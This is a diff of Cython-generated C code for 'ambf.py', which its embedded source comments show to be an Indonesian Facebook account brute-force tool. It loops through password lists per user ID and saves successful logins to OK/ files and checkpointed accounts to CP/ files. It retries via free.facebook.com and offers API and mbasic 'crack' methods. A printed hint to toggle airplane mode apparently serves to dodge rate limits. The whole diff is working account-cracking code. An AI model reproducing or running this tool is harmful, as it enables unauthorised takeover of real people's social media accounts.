+          __Pyx_INCREF(__pyx_kp_s__8);
+          __Pyx_XDECREF_SET(__pyx_v_year, __pyx_kp_s__8);
+          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
+          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+          goto __pyx_L30_exception_handled;
         }
 
-        /* "ambf.py":482
- * 	); sys.stdout.flush()
- * 	try:
- * 		for pw in pwx:             # <<<<<<<<<<<<<<
- * 			kwargs = {}
- * 			pw = pw.lower()
+        /* "ambf.py":517
+ * 				month = (" ")
+ * 				year = (" ")
+ * 			except:pass             # <<<<<<<<<<<<<<
+ * 			print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
+ * 			cp.append("%s|%s"%(uid, pw))
  */
-        __pyx_L17_continue:;
+        /*except:*/ {
+          __Pyx_ErrRestore(0,0,0);
+          goto __pyx_L30_exception_handled;
+        }
+        __pyx_L31_except_error:;
+
+        /* "ambf.py":503
+ * 			break
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():
+ * 			try:             # <<<<<<<<<<<<<<
+ * 				token = open("login.txt", "r").read()
+ * 				with requests.Session() as ses:
+ */
+        __Pyx_XGIVEREF(__pyx_t_1);
+        __Pyx_XGIVEREF(__pyx_t_2);
+        __Pyx_XGIVEREF(__pyx_t_3);
+        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
+        goto __pyx_L1_error;
+        __pyx_L34_try_break:;
+        __Pyx_XGIVEREF(__pyx_t_1);
+        __Pyx_XGIVEREF(__pyx_t_2);
+        __Pyx_XGIVEREF(__pyx_t_3);
+        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
+        goto __pyx_L12_break;
+        __pyx_L30_exception_handled:;
+        __Pyx_XGIVEREF(__pyx_t_1);
+        __Pyx_XGIVEREF(__pyx_t_2);
+        __Pyx_XGIVEREF(__pyx_t_3);
+        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
+        __pyx_L36_try_end:;
       }
-      __pyx_L18_break:;
-      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
 
-      /* "ambf.py":526
- * 				continue
- * 
- * 		loop+=1             # <<<<<<<<<<<<<<
- * 	except Exception as e:
- * 		if "free.facebook.com" in host:
+      /* "ambf.py":518
+ * 				year = (" ")
+ * 			except:pass
+ * 			print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))             # <<<<<<<<<<<<<<
+ * 			cp.append("%s|%s"%(uid, pw))
+ * 			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  */
-      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_loop); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 526, __pyx_L11_error)
-      __Pyx_GOTREF(__pyx_t_5);
-      __pyx_t_8 = __Pyx_PyInt_AddObjC(__pyx_t_5, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 526, __pyx_L11_error)
+      __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 518, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_INCREF(__pyx_v_uid);
+      __Pyx_GIVEREF(__pyx_v_uid);
+      PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_uid);
+      __Pyx_INCREF(__pyx_v_pw);
+      __Pyx_GIVEREF(__pyx_v_pw);
+      PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_pw);
+      __pyx_t_10 = __Pyx_PyString_Format(__pyx_kp_s_0_93m_s_s_0_97m, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 518, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+      if (__Pyx_PrintOne(0, __pyx_t_10) < 0) __PYX_ERR(0, 518, __pyx_L1_error)
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+
+      /* "ambf.py":519
+ * 			except:pass
+ * 			print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
+ * 			cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
+ * 			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+ * 			break
+ */
+      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_cp); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 519, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 519, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_INCREF(__pyx_v_uid);
+      __Pyx_GIVEREF(__pyx_v_uid);
+      PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_uid);
+      __Pyx_INCREF(__pyx_v_pw);
+      __Pyx_GIVEREF(__pyx_v_pw);
+      PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_pw);
+      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_11); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 519, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_8);
-      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
-      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_8) < 0) __PYX_ERR(0, 526, __pyx_L11_error)
+      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+      __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_10, __pyx_t_8); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 519, __pyx_L1_error)
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
       __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
 
-      /* "ambf.py":481
- * 		"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
- * 	); sys.stdout.flush()
- * 	try:             # <<<<<<<<<<<<<<
- * 		for pw in pwx:
- * 			kwargs = {}
+      /* "ambf.py":520
+ * 			print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
+ * 			cp.append("%s|%s"%(uid, pw))
+ * 			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
+ * 			break
+ * 		else:
  */
-    }
-    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
-    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    goto __pyx_L16_try_end;
-    __pyx_L11_error:;
-    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
-    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-
-    /* "ambf.py":527
- * 
- * 		loop+=1
- * 	except Exception as e:             # <<<<<<<<<<<<<<
- * 		if "free.facebook.com" in host:
- * 			return crack(uid, pwx, host)
- */
-    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
-    if (__pyx_t_7) {
-      __Pyx_AddTraceback("ambf.crack", __pyx_clineno, __pyx_lineno, __pyx_filename);
-      if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_5, &__pyx_t_10) < 0) __PYX_ERR(0, 527, __pyx_L13_except_error)
-      __Pyx_GOTREF(__pyx_t_8);
-      __Pyx_GOTREF(__pyx_t_5);
+      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 520, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_10);
-      __Pyx_INCREF(__pyx_t_5);
-      __pyx_v_e = __pyx_t_5;
-
-      /* "ambf.py":528
- * 		loop+=1
- * 	except Exception as e:
- * 		if "free.facebook.com" in host:             # <<<<<<<<<<<<<<
- * 			return crack(uid, pwx, host)
- * 		else:
- */
-      __pyx_t_20 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_free_facebook_com, __pyx_v_host, Py_EQ)); if (unlikely(__pyx_t_20 < 0)) __PYX_ERR(0, 528, __pyx_L13_except_error)
-      __pyx_t_21 = (__pyx_t_20 != 0);
-      if (__pyx_t_21) {
-
-        /* "ambf.py":529
- * 	except Exception as e:
- * 		if "free.facebook.com" in host:
- * 			return crack(uid, pwx, host)             # <<<<<<<<<<<<<<
- * 		else:
- * 			return crack(uid, pwx, "https://free.facebook.com")
- */
-        __Pyx_XDECREF(__pyx_r);
-        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_crack); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 529, __pyx_L13_except_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __pyx_t_6 = NULL;
-        __pyx_t_7 = 0;
-        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
-          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_11);
-          if (likely(__pyx_t_6)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
-            __Pyx_INCREF(__pyx_t_6);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_11, function);
-            __pyx_t_7 = 1;
-          }
+      __pyx_t_11 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 520, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 520, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_GIVEREF(__pyx_t_11);
+      PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_11);
+      __Pyx_INCREF(__pyx_n_s_a);
+      __Pyx_GIVEREF(__pyx_n_s_a);
+      PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_n_s_a);
+      __pyx_t_11 = 0;
+      __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_10, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 520, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_write); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 520, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+      __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 520, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_INCREF(__pyx_v_uid);
+      __Pyx_GIVEREF(__pyx_v_uid);
+      PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_uid);
+      __Pyx_INCREF(__pyx_v_pw);
+      __Pyx_GIVEREF(__pyx_v_pw);
+      PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_pw);
+      __pyx_t_12 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 520, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_12);
+      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+      __pyx_t_11 = NULL;
+      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
+        if (likely(__pyx_t_11)) {
+          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+          __Pyx_INCREF(__pyx_t_11);
+          __Pyx_INCREF(function);
+          __Pyx_DECREF_SET(__pyx_t_10, function);
         }
-        #if CYTHON_FAST_PYCALL
-        if (PyFunction_Check(__pyx_t_11)) {
-          PyObject *__pyx_temp[4] = {__pyx_t_6, __pyx_v_uid, __pyx_v_pwx, __pyx_v_host};
-          __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_7, 3+__pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 529, __pyx_L13_except_error)
-          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-          __Pyx_GOTREF(__pyx_t_12);
-        } else
-        #endif
-        #if CYTHON_FAST_PYCCALL
-        if (__Pyx_PyFastCFunction_Check(__pyx_t_11)) {
-          PyObject *__pyx_temp[4] = {__pyx_t_6, __pyx_v_uid, __pyx_v_pwx, __pyx_v_host};
-          __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_7, 3+__pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 529, __pyx_L13_except_error)
-          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-          __Pyx_GOTREF(__pyx_t_12);
-        } else
-        #endif
-        {
-          __pyx_t_14 = PyTuple_New(3+__pyx_t_7); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 529, __pyx_L13_except_error)
-          __Pyx_GOTREF(__pyx_t_14);
-          if (__pyx_t_6) {
-            __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_6); __pyx_t_6 = NULL;
-          }
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_7, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pwx);
-          __Pyx_GIVEREF(__pyx_v_pwx);
-          PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_7, __pyx_v_pwx);
-          __Pyx_INCREF(__pyx_v_host);
-          __Pyx_GIVEREF(__pyx_v_host);
-          PyTuple_SET_ITEM(__pyx_t_14, 2+__pyx_t_7, __pyx_v_host);
-          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_14, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 529, __pyx_L13_except_error)
-          __Pyx_GOTREF(__pyx_t_12);
-          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
-        }
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __pyx_r = __pyx_t_12;
-        __pyx_t_12 = 0;
-        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        goto __pyx_L14_except_return;
-
-        /* "ambf.py":528
- * 		loop+=1
- * 	except Exception as e:
- * 		if "free.facebook.com" in host:             # <<<<<<<<<<<<<<
- * 			return crack(uid, pwx, host)
- * 		else:
- */
       }
+      __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_11, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12);
+      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 520, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
 
-      /* "ambf.py":531
- * 			return crack(uid, pwx, host)
+      /* "ambf.py":521
+ * 			cp.append("%s|%s"%(uid, pw))
+ * 			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+ * 			break             # <<<<<<<<<<<<<<
  * 		else:
- * 			return crack(uid, pwx, "https://free.facebook.com")             # <<<<<<<<<<<<<<
- * 
- * def text_mulai():
+ * 			continue
  */
-      /*else*/ {
-        __Pyx_XDECREF(__pyx_r);
-        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_crack); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 531, __pyx_L13_except_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __pyx_t_14 = NULL;
-        __pyx_t_7 = 0;
-        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
-          __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_11);
-          if (likely(__pyx_t_14)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
-            __Pyx_INCREF(__pyx_t_14);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_11, function);
-            __pyx_t_7 = 1;
-          }
-        }
-        #if CYTHON_FAST_PYCALL
-        if (PyFunction_Check(__pyx_t_11)) {
-          PyObject *__pyx_temp[4] = {__pyx_t_14, __pyx_v_uid, __pyx_v_pwx, __pyx_kp_s_https_free_facebook_com};
-          __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_7, 3+__pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 531, __pyx_L13_except_error)
-          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-          __Pyx_GOTREF(__pyx_t_12);
-        } else
-        #endif
-        #if CYTHON_FAST_PYCCALL
-        if (__Pyx_PyFastCFunction_Check(__pyx_t_11)) {
-          PyObject *__pyx_temp[4] = {__pyx_t_14, __pyx_v_uid, __pyx_v_pwx, __pyx_kp_s_https_free_facebook_com};
-          __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_7, 3+__pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 531, __pyx_L13_except_error)
-          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-          __Pyx_GOTREF(__pyx_t_12);
-        } else
-        #endif
-        {
-          __pyx_t_6 = PyTuple_New(3+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 531, __pyx_L13_except_error)
-          __Pyx_GOTREF(__pyx_t_6);
-          if (__pyx_t_14) {
-            __Pyx_GIVEREF(__pyx_t_14); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_14); __pyx_t_14 = NULL;
-          }
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_6, 0+__pyx_t_7, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pwx);
-          __Pyx_GIVEREF(__pyx_v_pwx);
-          PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_7, __pyx_v_pwx);
-          __Pyx_INCREF(__pyx_kp_s_https_free_facebook_com);
-          __Pyx_GIVEREF(__pyx_kp_s_https_free_facebook_com);
-          PyTuple_SET_ITEM(__pyx_t_6, 2+__pyx_t_7, __pyx_kp_s_https_free_facebook_com);
-          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_6, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 531, __pyx_L13_except_error)
-          __Pyx_GOTREF(__pyx_t_12);
-          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-        }
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __pyx_r = __pyx_t_12;
-        __pyx_t_12 = 0;
-        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        goto __pyx_L14_except_return;
-      }
+      goto __pyx_L12_break;
+
+      /* "ambf.py":502
+ * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+ * 			break
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
+ * 			try:
+ * 				token = open("login.txt", "r").read()
+ */
     }
-    goto __pyx_L13_except_error;
-    __pyx_L13_except_error:;
+
+    /* "ambf.py":523
+ * 			break
+ * 		else:
+ * 			continue             # <<<<<<<<<<<<<<
+ * 
+ * 	loop+=1
+ */
+    /*else*/ {
+      goto __pyx_L11_continue;
+    }
 
     /* "ambf.py":481
  * 		"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
  * 	); sys.stdout.flush()
- * 	try:             # <<<<<<<<<<<<<<
- * 		for pw in pwx:
- * 			kwargs = {}
+ * 	for pw in pwx:             # <<<<<<<<<<<<<<
+ * 		kwargs = {}
+ * 		pw = pw.lower()
  */
-    __Pyx_XGIVEREF(__pyx_t_3);
-    __Pyx_XGIVEREF(__pyx_t_2);
-    __Pyx_XGIVEREF(__pyx_t_1);
-    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
-    goto __pyx_L1_error;
-    __pyx_L14_except_return:;
-    __Pyx_XGIVEREF(__pyx_t_3);
-    __Pyx_XGIVEREF(__pyx_t_2);
-    __Pyx_XGIVEREF(__pyx_t_1);
-    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
-    goto __pyx_L0;
-    __pyx_L16_try_end:;
+    __pyx_L11_continue:;
   }
+  __pyx_L12_break:;
+  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
+
+  /* "ambf.py":525
+ * 			continue
+ * 
+ * 	loop+=1             # <<<<<<<<<<<<<<
+ * 
+ * def text_mulai():
+ */
+  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_loop); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 525, __pyx_L1_error)
+  __Pyx_GOTREF(__pyx_t_5);
+  __pyx_t_8 = __Pyx_PyInt_AddObjC(__pyx_t_5, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 525, __pyx_L1_error)
+  __Pyx_GOTREF(__pyx_t_8);
+  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_8) < 0) __PYX_ERR(0, 525, __pyx_L1_error)
+  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
 
   /* "ambf.py":472
  * 	loop += 1
@@ -17120,7 +16880,6 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
   __Pyx_XDECREF(__pyx_v_month);
   __Pyx_XDECREF(__pyx_v_day);
   __Pyx_XDECREF(__pyx_v_year);
-  __Pyx_XDECREF(__pyx_v_e);
   __Pyx_XDECREF(__pyx_v_key);
   __Pyx_XDECREF(__pyx_v_value);
   __Pyx_XGIVEREF(__pyx_r);
@@ -17128,8 +16887,8 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
   return __pyx_r;
 }
 
-/* "ambf.py":533
- * 			return crack(uid, pwx, "https://free.facebook.com")
+/* "ambf.py":527
+ * 	loop+=1
  * 
  * def text_mulai():             # <<<<<<<<<<<<<<
  * 	print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))
@@ -17160,47 +16919,47 @@ static PyObject *__pyx_pf_4ambf_26text_mulai(CYTHON_UNUSED PyObject *__pyx_self)
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("text_mulai", 0);
 
-  /* "ambf.py":534
+  /* "ambf.py":528
  * 
  * def text_mulai():
  * 	print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))             # <<<<<<<<<<<<<<
  * 	print(" [+] hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
  * 	print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 534, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 528, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
-  __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_hasil_OK_disimpan_ke_OK_s_txt, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 534, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_hasil_OK_disimpan_ke_OK_s_txt, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 528, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
-  if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 534, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 528, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
-  /* "ambf.py":535
+  /* "ambf.py":529
  * def text_mulai():
  * 	print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))
  * 	print(" [+] hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))             # <<<<<<<<<<<<<<
  * 	print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
  * 
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 535, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 529, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_1 = __Pyx_PyString_FormatSafe(__pyx_kp_s_hasil_CP_disimpan_ke_CP_s_txt, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 535, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyString_FormatSafe(__pyx_kp_s_hasil_CP_disimpan_ke_CP_s_txt, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 529, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-  if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 535, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 529, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":536
+  /* "ambf.py":530
  * 	print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))
  * 	print(" [+] hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
  * 	print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")             # <<<<<<<<<<<<<<
  * 
  * def text_method():
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_jika_tidak_ada_hasil_hidupkan_m) < 0) __PYX_ERR(0, 536, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_jika_tidak_ada_hasil_hidupkan_m) < 0) __PYX_ERR(0, 530, __pyx_L1_error)
 
-  /* "ambf.py":533
- * 			return crack(uid, pwx, "https://free.facebook.com")
+  /* "ambf.py":527
+ * 	loop+=1
  * 
  * def text_mulai():             # <<<<<<<<<<<<<<
  * 	print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))
@@ -17221,7 +16980,7 @@ static PyObject *__pyx_pf_4ambf_26text_mulai(CYTHON_UNUSED PyObject *__pyx_self)
   return __pyx_r;
 }
 
-/* "ambf.py":538
+/* "ambf.py":532
  * 	print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
  * 
  * def text_method():             # <<<<<<<<<<<<<<
@@ -17251,43 +17010,43 @@ static PyObject *__pyx_pf_4ambf_28text_method(CYTHON_UNUSED PyObject *__pyx_self
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("text_method", 0);
 
-  /* "ambf.py":539
+  /* "ambf.py":533
  * 
  * def text_method():
  * 	print(" \n [ pilih method crack - coba method satu ]\n")             # <<<<<<<<<<<<<<
  * 	print(" [1]. method API (mode fast)")
  * 	print(" [2]. method mbasic (mode slow)")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_pilih_method_crack_coba_method) < 0) __PYX_ERR(0, 539, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_pilih_method_crack_coba_method) < 0) __PYX_ERR(0, 533, __pyx_L1_error)
 
-  /* "ambf.py":540
+  /* "ambf.py":534
  * def text_method():
